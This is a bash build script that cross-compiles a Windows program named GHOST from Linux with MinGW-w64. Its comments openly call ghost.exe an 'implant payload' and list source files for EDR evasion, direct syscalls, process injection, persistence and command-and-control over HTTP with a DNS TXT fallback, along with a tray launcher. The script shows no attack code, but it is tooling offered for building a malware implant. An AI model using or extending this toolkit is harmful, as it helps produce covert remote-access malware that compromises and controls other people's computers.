#!/bin/bash
# GHOST build script — cross-compile for Windows x64 from Linux via MinGW-w64.
#
# Usage:
#   ./build.sh              — release build (ghost.exe + launcher.exe)
#   ./build.sh --debug      — debug symbols, no strip, -DDEBUG
#   ./build.sh --setup      — install MinGW-w64 toolchain (Debian/Ubuntu/Kali)
#
# One-time setup on a fresh Linux box:
#   sudo apt update && sudo apt install -y mingw-w64
#   chmod +x build.sh && ./build.sh
#
# Cross-compile from WSL (Windows):
#   wsl sudo apt install mingw-w64 && wsl bash build.sh

set -e

# ---------------------------------------------------------------------------
# --setup: install MinGW-w64 toolchain
# ---------------------------------------------------------------------------

if [[ "$1" == "--setup" ]]; then
    echo "[*] Installing MinGW-w64 cross-compilation toolchain..."
    if command -v apt-get &>/dev/null; then
        sudo apt-get update -qq
        sudo apt-get install -y mingw-w64
    elif command -v dnf &>/dev/null; then
        sudo dnf install -y mingw64-gcc-c++
    elif command -v pacman &>/dev/null; then
        sudo pacman -S --noconfirm mingw-w64-gcc
    else
        echo "[!] Unknown package manager. Install mingw-w64 manually."
        exit 1
    fi
    echo "[+] Toolchain installed. Run './build.sh' to compile."
    exit 0
fi

# ---------------------------------------------------------------------------
# Verify toolchain is present
# ---------------------------------------------------------------------------

CXX="x86_64-w64-mingw32-g++"
WINDRES="x86_64-w64-mingw32-windres"

if ! command -v "$CXX" &>/dev/null; then
    echo "[!] $CXX not found. Run: ./build.sh --setup"
    exit 1
fi

echo "[*] Toolchain: $(${CXX} --version | head -1)"

# ---------------------------------------------------------------------------
# Parse flags
# ---------------------------------------------------------------------------

OUT_DIR="build"
DEBUG=0

for arg in "$@"; do
    case "$arg" in
        --debug) DEBUG=1 ;;
    esac
done

mkdir -p "$OUT_DIR"

# ---------------------------------------------------------------------------
# Shared compiler flags
# ---------------------------------------------------------------------------

COMMON_FLAGS=(
    -std=c++17
    -DUNICODE -D_UNICODE
    -D_WIN32_WINNT=0x0601      # Windows 7+ minimum
    -mwindows
    -static -static-libgcc -static-libstdc++
    -I include
    -Wall -Wextra
    -Wno-unused-parameter
    -Wno-cast-function-type    # FARPROC → typed pointer casts
)

if [ "$DEBUG" -eq 1 ]; then
    OPT_FLAGS=(-O0 -g -DDEBUG)
    STRIP_FLAG=""
    echo "[*] Building DEBUG..."
else
    OPT_FLAGS=(-O2)
    STRIP_FLAG="-s"
    echo "[*] Building RELEASE..."
fi

# ---------------------------------------------------------------------------
# ghost.exe — implant payload
#
# Library list (all required — DO NOT trim):
#   ntdll       — NT native syscall stubs (NtAllocate*, NtProtect*, etc.)
#   user32      — Window / message API (SetErrorMode, MessageBox guards)
#   advapi32    — Registry (RegOpenKey*), token (OpenProcessToken), crypto
#   ole32       — COM runtime (CoInitialize, CoCreateInstance) — WMI
#   oleaut32    — BSTR/VARIANT helpers (_bstr_t, _variant_t) — WMI
#   wbemidl     — WMI IWbemLocator / IWbemServices interfaces
#   bcrypt      — AES-256-GCM, SHA-256, BCryptGenRandom (utils.cpp)
#   winhttp     — WinHttpOpen / WinHttpConnect / WinHttpSendRequest (c2.cpp)
#   dnsapi      — DnsQuery — DNS TXT C2 fallback (c2.cpp)
# ---------------------------------------------------------------------------

echo "[*] Compiling resources..."
"$WINDRES" resources/ghost.rc -O coff -o "$OUT_DIR/ghost.res"

echo "[*] Compiling ghost.exe..."
"$CXX" "${COMMON_FLAGS[@]}" "${OPT_FLAGS[@]}" $STRIP_FLAG \
    src/main.cpp         \
    src/syscalls.cpp     \
    src/evasion.cpp      \
    src/injection.cpp    \
    src/persistence.cpp  \
    src/c2.cpp           \
    src/utils.cpp        \
    "$OUT_DIR/ghost.res" \
    -lntdll              \
    -luser32             \
    -ladvapi32           \
    -lole32              \
    -loleaut32           \
    -lwbemidl            \
    -lbcrypt             \
    -lwinhttp            \
    -ldnsapi             \
    -o "$OUT_DIR/ghost.exe"

echo "[+] ghost.exe built: $(du -sh "$OUT_DIR/ghost.exe" | cut -f1)"

# ---------------------------------------------------------------------------
# launcher.exe — tray launcher
# ---------------------------------------------------------------------------

echo "[*] Compiling launcher.exe..."
"$CXX" "${COMMON_FLAGS[@]}" "${OPT_FLAGS[@]}" $STRIP_FLAG \
    src/launcher.cpp \
    -luser32         \
    -lshell32        \
    -lwinhttp        \
    -o "$OUT_DIR/launcher.exe"

echo "[+] launcher.exe built: $(du -sh "$OUT_DIR/launcher.exe" | cut -f1)"

# ---------------------------------------------------------------------------
# Summary
# ---------------------------------------------------------------------------

echo ""
echo "[+] Build complete — output in $OUT_DIR/"
ls -lh "$OUT_DIR/"*.exe